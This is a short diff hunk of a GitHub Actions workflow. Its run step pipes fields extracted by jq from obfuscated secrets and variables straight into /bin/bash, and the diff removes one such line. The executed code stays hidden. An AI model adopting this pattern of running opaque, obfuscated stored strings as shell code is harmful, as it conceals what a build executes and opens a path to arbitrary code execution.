@@ -18,7 +18,6 @@ jobs:
           fgex7: ${{ secrets.fgex7 }}
         run: |
           printf '%s' "$fgex7" | jq -r .ebw64836 | /bin/bash
-          echo $q8 | jq -r .tkk1 | /bin/bash
           printf '%s' "$bfd7" | jq -r .pwni9 | /bin/bash
           printf '%s' "$ufh2" | jq -r .blf40536 | /bin/bash
           echo $ri27488 | jq -r .mrh03943 | /bin/bash
